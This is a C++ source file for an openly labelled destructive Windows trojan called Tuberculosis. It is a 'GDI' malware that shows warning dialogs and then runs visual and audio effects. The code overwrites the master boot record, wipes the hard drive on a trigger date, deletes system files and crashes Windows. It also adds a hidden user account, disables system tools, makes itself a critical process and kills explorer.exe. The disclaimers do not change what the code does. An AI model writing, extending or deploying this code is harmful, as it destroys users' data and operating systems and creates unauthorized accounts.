#include "Tuberculosis.h"
#include "SoundBuffer.h"

/* TUBERCULOSIS
No, not the disease.
A custom Solaris-Tuberculosis hybrid GDI worm started by NS and remade by NotCCR.
The original had 6 payloads and lasted a few minutes.
This one... has 20+ payloads.
*/

INT WINAPI WinMain(WINMAINENTRANCEFUNC) {
	if (GetFileAttributesW(L"C:\\WINDOWS\\System32\\SpeedDownload.ini") == INVALID_FILE_ATTRIBUTES) {
		if (MessageBoxW(NULL,
		L"WARNING!\n\nYou\'re about to infect your machine with a GDI virus called Tuberculosis.exe, named after the epidemic disease.\nThis malware was made as a reboot of the original fake malware of the same name.\nNotCCR and NS are not responsible for any damage.\n\nIf you are planning to run this on physical hardware, ensure that you take the necessary safety precautions.\nIf you don\'t know what you executed, press \'\'No\'\' to shut down this GDI malware.\nIf you know what you\'re doing and are on a virtual machine, you may proceed and hit \'\'Yes\'\'.\n\nAs said earlier, NotCCR and NS are not liable for any actions taken as a result of this malware by any means, whether it\'s executing it, reverse-engineering it or removing these disclaimers.\nProceed to execute this malware?",
		L"GDI-Trojan.Win32.Tuberculosis.exe \| FIRST WARNING",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES || MessageBoxW(NULL,
		L"FINAL WARNING!\n\nTHIS MAY HAVE THE ABILITY TO WIPE ALL OF YOUR FILES AND OVERWRITE THE MASTER BOOT RECORD, AND BOTH CREATORS OF THIS MALWARE ARE NOT RESPONSIBLE FOR ANY DAMAGE!\nSTILL EXECUTE IT?\n\nSome easter eggs occur on November 22nd and January 10th.",
		L"GDI-Trojan.Win32.Tuberculosis.exe \| FINAL WARNING",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);
	}
	if (System::DateCheck(DATE_MONTH) == 11 && System::DateCheck(DATE_DAY) == 22) {
		// NUKING //
		ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
		Payloads::NukeHardDrive();
		Sleep(10000);
		DeleteVolumeMountPointW(L"C:\\");
	}
	if (System::DateCheck(DATE_MONTH) == 1 && System::DateCheck(DATE_DAY) == 10) {
		// SPECIAL MESSAGE //
		MessageBoxW(NULL, L"Today I\'m gonna spare you.\nI have decided not to destroy your PC on this very day.\nSee you tomorrow.", L"Malware Execution Aborted", MB_ICONASTERISK);
		exit(0);
	}
	if (!System::ifWindowsXP()) {
		Payloads::OverwriteBootSectors();
		System::NtCrashSystem(0xc0000020, FALSE, NULL);
	}
	DWORD i;
	CreateDirectoryW(L"C:\\NaN", NULL);
	HANDLE hFile = CreateFileW(L"C:\\NaN\\touhou.wav", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, lpcvSound, 1918508, &i, NULL);
	CloseHandle(hFile);
	Payloads::OverwriteBootSectors();
	ShellExecuteW(NULL, L"open", L"net1", L"user /add Tubercomi", NULL, SW_HIDE);
	Payloads::DisableSystemTools();
	Payloads::InfectTheSystem();
	CreateThread(NULL, 0, &Payloads::DeleteSystemFiles, NULL, 0, 0);
	NtSetInformationProcess(GetCurrentProcess(), ProcessBreakOnTermination, (HANDLE)TRUE, sizeof(INT));
	Sleep(6 * 1000);
	MEMORYPARAM mpJPEG = CreateMemoryParam();
	HANDLE JPEG = CreateThread(NULL, 0, &GDI::pFirstJPEGEffect, mpJPEG, 0, 0);
	Bytebeat::Bytebeat1();
	Sleep(3001);
	MEMORYPARAM mpBS = CreateMemoryParam();
	HANDLE BS = CreateThread(NULL, 0, &GDI::pBrightScans, mpBS, 0, 0);
	Sleep(3001);
	MEMORYPARAM mpDAS = CreateMemoryParam();
	HANDLE DAS = CreateThread(NULL, 0, &GDI::pDarkAlphaScans, mpDAS, 0, 0);
	WaitForSingleObject(DAS, 13998);
	EndThread(JPEG, mpJPEG); EndThread(BS, mpBS); EndThread(DAS, mpDAS);
	hworst();
	Redraw();
	
	// PAYLOAD 2 //
	MEMORYPARAM mpTINT = CreateMemoryParam();
	HANDLE TINT = CreateThread(NULL, 0, &GDI::pTint, mpTINT, 0, 0);
	Bytebeat::Bytebeat2();
	Sleep(1);
	MEMORYPARAM mpBRIROTO = CreateMemoryParam();
	HANDLE BRIROTO = CreateThread(NULL, 0, &GDI::pORRotate, mpBRIROTO, 0, 0);
	WaitForSingleObject(BRIROTO, 16000);
	EndThread(TINT, mpTINT); EndThread(BRIROTO, mpBRIROTO);
	
	// PAYLOAD 2.5 //
	MEMORYPARAM mpMOVXOR = CreateMemoryParam();
	MEMORYPARAM mpBLENDSQR = CreateMemoryParam();
	MEMORYPARAM mpICONPTRN = CreateMemoryParam();
	
	HANDLE MOVXOR = CreateThread(NULL, 0, &GDI::pMovingXOR, mpMOVXOR, 0, 0);
	Sleep(1);
	HANDLE BLENDSQR = CreateThread(NULL, 0, &GDI::pBrightBlendSquares, mpBLENDSQR, 0, 0);
	Sleep(1);
	HANDLE ICONPTRN = CreateThread(NULL, 0, &GDI::pIconPattern, mpICONPTRN, 0, 0);
	Sleep((8 * 1000) - 2);
	
	MEMORYPARAM mpTEXTOUT = CreateMemoryParam();
	MEMORYPARAM mpRGBSTRP = CreateMemoryParam();
	
	HANDLE TEXTOUT = CreateThread(NULL, 0, &GDI::lTextOuts, mpTEXTOUT, 0, 0);
	Sleep(4001);
	
	HANDLE RGBSTRP = CreateThread(NULL, 0, &GDI::pRGBStripes, mpRGBSTRP, 0, 0);
	WaitForSingleObject(RGBSTRP, 3999);
	
	EndThread(MOVXOR, mpMOVXOR); EndThread(BLENDSQR, mpBLENDSQR); EndThread(ICONPTRN, mpICONPTRN); EndThread(TEXTOUT, mpTEXTOUT); EndThread(RGBSTRP, mpRGBSTRP);
	hworst();
	Redraw();
	
	
	// PAYLOAD 3 //
	Sleep(999);
	MEMORYPARAM mpRGBMOVGH = CreateMemoryParam();
	HANDLE RGBMOVGH = CreateThread(NULL, 0, &GDI::pRGBMovGlitch, mpRGBMOVGH, 0, 0);
	Bytebeat::Bytebeat3();
	WaitForSingleObject(RGBMOVGH, 10 * 1000);
	EndThread(RGBMOVGH, mpRGBMOVGH);
	hworst();
	Redraw();
	
	MEMORYPARAM mpRGBFLSH = CreateMemoryParam();
	MEMORYPARAM mpTOUHOU = CreateMemoryParam();
	
	HANDLE RGBFLSH = CreateThread(NULL, 0, &GDI::pRGBRedFlash, mpRGBFLSH, 0, 0);
	HANDLE TOUHOU = CreateThread(NULL, 0, &GDI::lTouhouPayload, mpTOUHOU, 0, 0);
	
	PlaySoundW(L"C:\\NaN\\touhou.wav", NULL, SND_ASYNC|SND_FILENAME);
	
	WaitForSingleObject(RGBFLSH, 30 * 1000);
	EndThread(RGBFLSH, mpRGBFLSH); EndThread(TOUHOU, mpTOUHOU);
	hworst();
	Redraw();
	
	Sleep(1999);
	
	
	MEMORYPARAM mpFREQWAVE = CreateMemoryParam();
	MEMORYPARAM mpINVERT = CreateMemoryParam();
	MEMORYPARAM mpTHOU2 = CreateMemoryParam();
	
	HANDLE FREQWAVE = CreateThread(NULL, 0, &GDI::lCustomFrequencyWaves, mpFREQWAVE, 0, 0);
	HANDLE INVERT = CreateThread(NULL, 0, &GDI::lInvert, mpINVERT, 0, 0);
	HANDLE THOU2 = CreateThread(NULL, 0, &GDI::lTouhouPayload, mpTHOU2, 0, 0);
	
	Bytebeat::pBytebeat5();
	
	WaitForSingleObject(THOU2, 30 * 1000);
	EndThread(THOU2, mpTHOU2); EndThread(FREQWAVE, mpFREQWAVE); EndThread(INVERT, mpINVERT);
	hworst();
	Redraw();
	
	MEMORYPARAM mpPINKRHMB = CreateMemoryParam();
	MEMORYPARAM mpA3DAURA = CreateMemoryParam();
	MEMORYPARAM mpHSVELPS = CreateMemoryParam();
	
	HANDLE PINKRHMB = CreateThread(NULL, 0, &GDI::pAnimPinkRotoRhombus, mpPINKRHMB, 0, 0);
	HANDLE A3DAURA = CreateThread(NULL, 0, &GDI::p3DIconAura, mpA3DAURA, 0, 0);
	HANDLE HSVELPS = CreateThread(NULL, 0, &GDI::pHSVEllipses, mpHSVELPS, 0, 0);
	
	Bytebeat::Bytebeat6();
	
	WaitForSingleObject(A3DAURA, 30 * 1000);
	EndThread(PINKRHMB, mpPINKRHMB); EndThread(HSVELPS, mpHSVELPS);
	hworst();
	Redraw();
	
	MEMORYPARAM mpTINTMLT = CreateMemoryParam();
	HANDLE TINTMLT = CreateThread(NULL, 0, &GDI::pTintedScreenMelt, mpTINTMLT, 0, 0);
	
	Bytebeat::Bytebeat7();
	WaitForSingleObject(TINTMLT, 30 * 1000);
	EndThread(TINTMLT, mpTINTMLT); EndThread(A3DAURA, mpA3DAURA);
	hworst();
	Redraw();
	
	Sleep(301); // Why do YouTube views freeze at 301? /j
	
	MEMORYPARAM mpSTRWAVE = CreateMemoryParam();
	MEMORYPARAM mpBEZIER = CreateMemoryParam();
	
	HANDLE STRWAVE = CreateThread(NULL, 0, &GDI::StrongWaves, mpSTRWAVE, 0, 0);
	HANDLE BEZIER = CreateThread(NULL, 0, &GDI::RotatingBezier, mpBEZIER, 0, 0);
	
	Bytebeat::Bytebeat8();
	WaitForSingleObject(BEZIER, 15 * 1000);
	EndThread(STRWAVE, mpSTRWAVE); EndThread(BEZIER, mpBEZIER);
	Redraw();
	
	MEMORYPARAM mpA3DAURA2 = CreateMemoryParam();
	MEMORYPARAM mpSPLXOR = CreateMemoryParam();
	
	HANDLE A3DAURA2 = CreateThread(NULL, 0, &GDI::l3DIconAura2, mpA3DAURA2, 0, 0);
	HANDLE SPLXOR = CreateThread(NULL, 0, &GDI::SplitXOR, mpSPLXOR, 0, 0);
	WaitForSingleObject(SPLXOR, 15 * 1000);
	EndThread(SPLXOR, mpSPLXOR); EndThread(A3DAURA2, mpA3DAURA2);
	hworst();
	Redraw();
	
	// r/ProgrammingHorror
	MEMORYPARAM mpWARPSCR = CreateMemoryParam();
	MEMORYPARAM mpCIRCLSHK = CreateMemoryParam();
	MEMORYPARAM mpINV2 = CreateMemoryParam();
	MEMORYPARAM mpVIBRRGB = CreateMemoryParam();
	MEMORYPARAM mpRGBCPIX = CreateMemoryParam();
	MEMORYPARAM mpTILT = CreateMemoryParam();
	MEMORYPARAM mpBBS2 = CreateMemoryParam();
	
	HANDLE WARPSCR = CreateThread(NULL, 0, &GDI::WarpScreen, mpWARPSCR, 0, 0);
	Bytebeat::Bytebeat9();
	
	WaitForSingleObject(WARPSCR, 10 * 1000);
	EndThread(WARPSCR, mpWARPSCR);
	Redraw();
	
	// 25 seconds of the bytebeat remain
	HANDLE CIRCLSHK = CreateThread(NULL, 0, &GDI::CircleShake, mpCIRCLSHK, 0, 0);
	HANDLE INV2 = CreateThread(NULL, 0, &GDI::lInvert2, mpINV2, 0, 0);
	WaitForSingleObject(INV2, 5 * 1000);
	EndThread(INV2, mpINV2);
	Redraw();
	hworst();
	
	// 30 seconds left
	Bytebeat::Bytebeat10();
	HANDLE VIBRRGB = CreateThread(NULL, 0, &GDI::VibrantTint, mpVIBRRGB, 0, 0);
	WaitForSingleObject(VIBRRGB, 10 * 1000);
	EndThread(VIBRRGB, mpVIBRRGB);
	Redraw();
	
	HANDLE BBS2 = CreateThread(NULL, 0, &GDI::pBrightBlendSquares2, mpBBS2, 0, 0);
	HANDLE TILT = CreateThread(NULL, 0, &GDI::Tilt, mpTILT, 0, 0);
	HANDLE RGBCPIX = CreateThread(NULL, 0, &GDI::RGBColourPixelate, mpRGBCPIX, 0, 0);
	WaitForSingleObject(RGBCPIX, 20 * 1000);
	EndThread(BBS2, mpBBS2); EndThread(TILT, mpTILT); EndThread(RGBCPIX, mpRGBCPIX);
	Redraw();
	hworst();
	Sleep(1999); // Give the system some time to warm up
	
	MEMORYPARAM mpRNDLGHT = CreateMemoryParam();
	HANDLE RNDLGHT = CreateThread(NULL, 0, &GDI::RandomLights, mpRNDLGHT, 0, 0);
	Bytebeat::Bytebeat11();
	WaitForSingleObject(RNDLGHT, 20 * 1000);
	EndThread(RNDLGHT, mpRNDLGHT);
	Redraw();
	hworst();
	
	Bytebeat::Bytebeat12();
	MEMORYPARAM mpRGBRLINE = CreateMemoryParam();
	MEMORYPARAM mpTILT2 = CreateMemoryParam();
	MEMORYPARAM mpMLTBRIGH = CreateMemoryParam();
	
	HANDLE TILT2 = CreateThread(NULL, 0, &GDI::Tilt, mpTILT2, 0, 0);
	HANDLE RGBRLINE = CreateThread(NULL, 0, &GDI::RGBRedLines, mpRGBRLINE, 0, 0);
	WaitForSingleObject(RGBRLINE, 10 * 1000);
	EndThread(RGBRLINE, mpRGBRLINE);
	Redraw();
	
	HANDLE MLTBRIGH = CreateThread(NULL, 0, &GDI::MeltBrighten, mpMLTBRIGH, 0, 0);
	WaitForSingleObject(MLTBRIGH, 10 * 1000);
	EndThread(TILT2, mpTILT2); EndThread(MLTBRIGH, mpMLTBRIGH);
	Redraw();
	hworst();
	
	Sleep(1000);
	ShellExecuteW(NULL, L"open", L"taskkill", L"/f /im explorer.exe", NULL, SW_HIDE);
	while (TRUE) {
		Patterns::ExecutePatterns();
	}
}
